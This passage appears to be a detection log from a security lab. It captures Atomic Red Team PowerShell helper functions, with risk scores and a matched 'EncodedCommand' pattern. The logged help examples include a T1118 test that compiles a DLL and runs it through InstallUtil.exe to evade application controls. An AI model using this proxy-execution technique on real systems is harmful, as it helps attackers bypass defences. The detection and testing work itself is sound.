ExecutorCleanupCommand\n\nSpecifies the command to execute if there are any artifacts that need to be cleaned up.\n\n.PARAMETER InputArguments\n\nSpecifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.\n\n.PARAMETER DependencyExecutorType\n\nSpecifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.\n\nIn most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.\n\n.PARAMETER Dependencies\n\nSpecifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n.OUTPUTS\n\nAtomicTest\n\nOutputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.\n\nThe output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]\n    [OutputType([AtomicTest])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String[]]\n        [ValidateSet('Windows', 'macOS', 'Linux')]\n        $SupportedPlatforms,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $ExecutorType,\n\n        [Switch]\n        $ExecutorElevationRequired,\n\n        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorSteps,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCommand,\n\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCleanupCommand,\n\n        [AtomicInputArgument[]]\n        $InputArguments,\n\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $DependencyExecutorType,\n\n        [AtomicDependency[]]\n        $Dependencies\n    )\n\n    $AtomicTestInstance = [AtomicTest]::new()\n\n    $AtomicTestInstance.name = $Name\n    $AtomicTestInstance.description = $Description\n    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }\n\n    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'AutomatedExecutor' {\n            $ExecutorInstance = [AtomicExecutorDefault]::new()\n            $ExecutorInstance.command = $ExecutorCommand\n            $StringsWithPotentialInputArgs.Add($ExecutorCommand)\n        }\n\n        'ManualExecutor' {\n            $ExecutorInstance = [AtomicExecutorManual]::new()\n            $ExecutorInstance.steps = $ExecutorSteps\n            $StringsWithPotentialInputArgs.Add($ExecutorSteps)\n        }\n    }\n\n    switch ($ExecutorType) {\n        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }\n        default { $ExecutorInstance.name = $ExecutorType.ToLower() }\n    }\n\n    if ($ExecutorCleanupCommand) {\n        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand\n        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)\n    }\n\n    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }\n\n    if ($Dependencies) {\n        foreach ($Dependency in $Dependencies) {\n            $StringsWithPotentialInputArgs.Add($Dependency.description)\n            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)\n            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)\n        }\n    }\n\n    if ($DependencyExecutorType) {\n        switch ($DependencyExecutorType) {\n            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }\n            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }\n        }\n    }    $AtomicTestInstance.dependencies = $Dependencies\n\n    [Hashtable] $InputArgHashtable = @{ }\n\n    if ($InputArguments.Count) {\n        # Determine if any of the input argument names repeat. They must be unique.\n        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {\n            Write-Error \"There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.\"\n            return\n        }\n\n        # Convert each input argument to a hashtable where the key is the Name property.\n\n        foreach ($InputArg in $InputArguments) {\n            # Create a copy of the passed input argument that doesn't include the \"Name\" property.\n            # Passing in a shallow copy adversely affects YAML serialization for some reason.\n            $NewInputArg = [AtomicInputArgument]::new()\n            $NewInputArg.default = $InputArg.default\n            $NewInputArg.description = $InputArg.description\n            $NewInputArg.type = $InputArg.type\n\n            $InputArgHashtable[$InputArg.Name] = $NewInputArg\n        }\n\n        $AtomicTestInstance.input_arguments = $InputArgHashtable\n    }\n\n    # Extract all specified input arguments from executor and any dependencies.\n    $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n    ForEach-Object { $Regex.Matches($_) } |\n    Select-Object -ExpandProperty Groups |\n    Where-Object { $_.Name -eq 'ArgName' } |\n    Select-Object -ExpandProperty Value |\n    Sort-Object -Unique\n\n\n    # Validate that all executor arguments are defined as input arguments\n    if ($InputArgumentNamesFromExecutor.Count) {\n        $InputArgumentNamesFromExecutor | ForEach-Object {\n            if ($InputArgHashtable.Keys -notcontains $_) {\n                Write-Error \"The following input argument was specified but is not defined: '$_'\"\n                return\n            }\n        }\n    }\n\n    # Validate that all defined input args are utilized at least once in the executor.\n    if ($InputArgHashtable.Keys.Count) {\n        $InputArgHashtable.Keys | ForEach-Object {\n            if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                # Write a warning since this scenario is not considered a breaking change\n                Write-Warning \"The following input argument is defined but not utilized: '$_'.\"\n            }\n        }\n    }\n\n    $AtomicTestInstance.executor = $ExecutorInstance\n\n    return $AtomicTestInstance\n}\n\nfunction New-AtomicTestDependency {\n    <#\n.SYNOPSIS\n\nSpecifies a new dependency that must be met prior to execution of an atomic test.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING\n\n.PARAMETER PrereqCommand\n\nSpecifies commands to check if prerequisites for running this test are met.\n\nFor the \"command_prompt\" executor, if any command returns a non-zero exit code, the pre-requisites are not met.\n\nFor the \"powershell\" executor, all commands are run as a script block and the script block must return 0 for success.\n\n.PARAMETER GetPrereqCommand\n\nSpecifies commands to meet this prerequisite or a message describing how to meet this prereq\n\nMore specifically, this command is designed to satisfy either of the following conditions:\n\n1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.\n2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.\n\n.EXAMPLE\n\n$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'\n\n.OUTPUTS\n\nAtomicDependency\n\nOutputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.\n\nNote: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to \"Select-Object description, prereq_command, get_prereq_command\".\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicDependency])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $PrereqCommand,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $GetPrereqCommand\n    )\n\n    $DependencyInstance = [AtomicDependency]::new()\n\n    $DependencyInstance.description = $Description\n    $DependencyInstance.prereq_command = $PrereqCommand\n    $DependencyInstance.get_prereq_command = $GetPrereqCommand\n\n    return $DependencyInstance\n}\n\nfunction New-AtomicTestInputArgument {\n    <#\n.SYNOPSIS\n\nSpecifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).\n\n.PARAMETER Name\n\nSpecifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the input argument.\n\n.PARAMETER Type\n\nSpecifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.\n\n.PARAMETER TypeOverride\n\nSpecifies an unsupported input argument data type. Specifying this parameter should not be common.\n\n.PARAMETER Default\n\nSpecifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.\n\n.EXAMPLE\n\n$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\\WinRAR\\Rar.exe'\n\n.OUTPUTS\n\nAtomicInputArgument\n\nOutputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]\n    [OutputType([AtomicInputArgument])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]\n        [String]\n        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]\n        $Type,\n\n        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $TypeOverride,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Default\n    )\n\n    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {\n        Write-Error \"Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name\"\n        return\n    }\n\n    $AtomicInputArgInstance = [AtomicInputArgument]::new()\n\n    $AtomicInputArgInstance.description = $Description\n    $AtomicInputArgInstance.default = $Default\n\n    if ($Type) {\n        $AtomicInputArgInstance.type = $Type\n\n        # Validate input argument types when it makes sense to do so.\n        switch ($Type) {\n            'Url' {\n                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {\n                    Write-Warning \"The specified Url is not properly formatted: $Type\"\n                }\n            }\n\n            'Integer' {\n                if (-not [Int]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Int is not properly formatted: $Type\"\n                }\n            }\n\n            'Float' {\n                if (-not [Double]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Float is not properly formatted: $Type\"\n                }\n            }\n\n            # The following supported data types do not make sense to validate:\n            # 'Path' { }\n            # 'String' { }\n        }\n    }\n    else {\n        $AtomicInputArgInstance.type = $TypeOverride\n    }\n\n    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument\n    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml\n    # won't convert note properties during serialization.\n    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value $Name -PassThru\n\n    return $InputArgument\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e #'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2519467+00:00",
      "event_id": 35711091,
      "risk_score": 4,
      "detected_patterns": ", EncodedCommand",
      "pattern_details": "EncodedCommand [Score: 4]",
      "command_length": 19452,
      "full_command": "# The class definitions that these functions rely upon are located in Private\\AtomicClassSchema.ps1\n\nfunction New-AtomicTechnique {\n    <#\n.SYNOPSIS\n\nSpecifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.\n\n.PARAMETER AttackTechnique\n\nSpecifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with \"T\" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN\n\n.PARAMETER DisplayName\n\nSpecifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'\n\n.PARAMETER AtomicTests\n\nSpecifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n# Note: the input arguments are identical for atomic test #1 and #2\n$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename} #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? #{filename}\n'@\n\n$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2\n\n# Everything is ready to convert to YAML now!\n$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml\n\n.OUTPUTS\n\nAtomicTechnique\n\nOutputs an object representing an atomic technique.\n\nThe output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory)]\n        [String[]]\n        $AttackTechnique,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $DisplayName,\n\n        [Parameter(Mandatory)]\n        [AtomicTest[]]\n        [ValidateNotNull()]\n        $AtomicTests\n    )\n\n    $AtomicTechniqueInstance = [AtomicTechnique]::new()\n\n    foreach ($Technique in $AttackTechnique) {\n        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.\n        # This is not a requirement so just warn the user.\n        if ($Technique -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n            Write-Warning \"The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique\"\n        }\n    }\n\n    $AtomicTechniqueInstance.attack_technique = $AttackTechnique\n    $AtomicTechniqueInstance.display_name = $DisplayName\n    $AtomicTechniqueInstance.atomic_tests = $AtomicTests\n\n    return $AtomicTechniqueInstance\n}\n\nfunction New-AtomicTest {\n    <#\n.SYNOPSIS\n\nSpecifies an atomic test.\n\n.PARAMETER Name\n\nSpecifies the name of the test that indicates how it tests the technique.\n\n.PARAMETER Description\n\nSpecifies a long form description of the test. Markdown is supported.\n\n.PARAMETER SupportedPlatforms\n\nSpecifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.\n\nA single test can support multiple platforms.\n\n.PARAMETER ExecutorType\n\nSpecifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.\n\n- CommandPrompt: The Windows Command Prompt, aka cmd.exe\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.\n\n- PowerShell: PowerShell\n  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe\n\n- Sh: Linux's bourne shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.\n\n- Bash: Linux's bourne again shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.\n\n.PARAMETER ExecutorElevationRequired\n\nSpecifies that the test must run with elevated privileges.\n\n.PARAMETER ExecutorSteps\n\nSpecifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.\n\n.PARAMETER ExecutorCommand\n\nSpecifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.\n\nThe -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the \"PowerShell\" ExecutorType is specified.\n\n.PARAMETER ExecutorCleanupCommand\n\nSpecifies the command to execute if there are any artifacts that need to be cleaned up.\n\n.PARAMETER InputArguments\n\nSpecifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.\n\n.PARAMETER DependencyExecutorType\n\nSpecifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.\n\nIn most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.\n\n.PARAMETER Dependencies\n\nSpecifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n.OUTPUTS\n\nAtomicTest\n\nOutputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.\n\nThe output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]\n    [OutputType([AtomicTest])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String[]]\n        [ValidateSet('Windows', 'macOS', 'Linux')]\n        $SupportedPlatforms,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $ExecutorType,\n\n        [Switch]\n        $ExecutorElevationRequired,\n\n        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorSteps,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCommand,\n\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCleanupCommand,\n\n        [AtomicInputArgument[]]\n        $InputArguments,\n\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $DependencyExecutorType,\n\n        [AtomicDependency[]]\n        $Dependencies\n    )\n\n    $AtomicTestInstance = [AtomicTest]::new()\n\n    $AtomicTestInstance.name = $Name\n    $AtomicTestInstance.description = $Description\n    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }\n\n    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'AutomatedExecutor' {\n            $ExecutorInstance = [AtomicExecutorDefault]::new()\n            $ExecutorInstance.command = $ExecutorCommand\n            $StringsWithPotentialInputArgs.Add($ExecutorCommand)\n        }\n\n        'ManualExecutor' {\n            $ExecutorInstance = [AtomicExecutorManual]::new()\n            $ExecutorInstance.steps = $ExecutorSteps\n            $StringsWithPotentialInputArgs.Add($ExecutorSteps)\n        }\n    }\n\n    switch ($ExecutorType) {\n        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }\n        default { $ExecutorInstance.name = $ExecutorType.ToLower() }\n    }\n\n    if ($ExecutorCleanupCommand) {\n        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand\n        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)\n    }\n\n    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }\n\n    if ($Dependencies) {\n        foreach ($Dependency in $Dependencies) {\n            $StringsWithPotentialInputArgs.Add($Dependency.description)\n            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)\n            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)\n        }\n    }\n\n    if ($DependencyExecutorType) {\n        switch ($DependencyExecutorType) {\n            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }\n            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }\n        }\n    }    $AtomicTestInstance.dependencies = $Dependencies\n\n    [Hashtable] $InputArgHashtable = @{ }\n\n    if ($InputArguments.Count) {\n        # Determine if any of the input argument names repeat. They must be unique.\n        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {\n            Write-Error \"There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.\"\n            return\n        }\n\n        # Convert each input argument to a hashtable where the key is the Name property.\n\n        foreach ($InputArg in $InputArguments) {\n            # Create a copy of the passed input argument that doesn't include the \"Name\" property.\n            # Passing in a shallow copy adversely affects YAML serialization for some reason.\n            $NewInputArg = [AtomicInputArgument]::new()\n            $NewInputArg.default = $InputArg.default\n            $NewInputArg.description = $InputArg.description\n            $NewInputArg.type = $InputArg.type\n\n            $InputArgHashtable[$InputArg.Name] = $NewInputArg\n        }\n\n        $AtomicTestInstance.input_arguments = $InputArgHashtable\n    }\n\n    # Extract all specified input arguments from executor and any dependencies.\n    $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n    ForEach-Object { $Regex.Matches($_) } |\n    Select-Object -ExpandProperty Groups |\n    Where-Object { $_.Name -eq 'ArgName' } |\n    Select-Object -ExpandProperty Value |\n    Sort-Object -Unique\n\n\n    # Validate that all executor arguments are defined as input arguments\n    if ($InputArgumentNamesFromExecutor.Count) {\n        $InputArgumentNamesFromExecutor | ForEach-Object {\n            if ($InputArgHashtable.Keys -notcontains $_) {\n                Write-Error \"The following input argument was specified but is not defined: '$_'\"\n                return\n            }\n        }\n    }\n\n    # Validate that all defined input args are utilized at least once in the executor.\n    if ($InputArgHashtable.Keys.Count) {\n        $InputArgHashtable.Keys | ForEach-Object {\n            if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                # Write a warning since this scenario is not considered a breaking change\n                Write-Warning \"The following input argument is defined but not utilized: '$_'.\"\n            }\n        }\n    }\n\n    $AtomicTestInstance.executor = $ExecutorInstance\n\n    return $AtomicTestInstance\n}\n\nfunction New-AtomicTestDependency {\n    <#\n.SYNOPSIS\n\nSpecifies a new dependency that must be met prior to execution of an atomic test.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING\n\n.PARAMETER PrereqCommand\n\nSpecifies commands to check if prerequisites for running this test are met.\n\nFor the \"command_prompt\" executor, if any command returns a non-zero exit code, the pre-requisites are not met.\n\nFor the \"powershell\" executor, all commands are run as a script block and the script block must return 0 for success.\n\n.PARAMETER GetPrereqCommand\n\nSpecifies commands to meet this prerequisite or a message describing how to meet this prereq\n\nMore specifically, this command is designed to satisfy either of the following conditions:\n\n1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.\n2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.\n\n.EXAMPLE\n\n$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'\n\n.OUTPUTS\n\nAtomicDependency\n\nOutputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.\n\nNote: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to \"Select-Object description, prereq_command, get_prereq_command\".\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicDependency])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $PrereqCommand,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $GetPrereqCommand\n    )\n\n    $DependencyInstance = [AtomicDependency]::new()\n\n    $DependencyInstance.description = $Description\n    $DependencyInstance.prereq_command = $PrereqCommand\n    $DependencyInstance.get_prereq_command = $GetPrereqCommand\n\n    return $DependencyInstance\n}\n\nfunction New-AtomicTestInputArgument {\n    <#\n.SYNOPSIS\n\nSpecifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).\n\n.PARAMETER Name\n\nSpecifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the input argument.\n\n.PARAMETER Type\n\nSpecifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.\n\n.PARAMETER TypeOverride\n\nSpecifies an unsupported input argument data type. Specifying this parameter should not be common.\n\n.PARAMETER Default\n\nSpecifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.\n\n.EXAMPLE\n\n$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\\WinRAR\\Rar.exe'\n\n.OUTPUTS\n\nAtomicInputArgument\n\nOutputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]\n    [OutputType([AtomicInputArgument])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]\n        [String]\n        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]\n        $Type,\n\n        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $TypeOverride,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Default\n    )\n\n    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {\n        Write-Error \"Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name\"\n        return\n    }\n\n    $AtomicInputArgInstance = [AtomicInputArgument]::new()\n\n    $AtomicInputArgInstance.description = $Description\n    $AtomicInputArgInstance.default = $Default\n\n    if ($Type) {\n        $AtomicInputArgInstance.type = $Type\n\n        # Validate input argument types when it makes sense to do so.\n        switch ($Type) {\n            'Url' {\n                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {\n                    Write-Warning \"The specified Url is not properly formatted: $Type\"\n                }\n            }\n\n            'Integer' {\n                if (-not [Int]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Int is not properly formatted: $Type\"\n                }\n            }\n\n            'Float' {\n                if (-not [Double]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Float is not properly formatted: $Type\"\n                }\n            }\n\n            # The following supported data types do not make sense to validate:\n            # 'Path' { }\n            # 'String' { }\n        }\n    }\n    else {\n        $AtomicInputArgInstance.type = $TypeOverride\n    }\n\n    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument\n    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml\n    # won't convert note properties during serialization.\n    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value 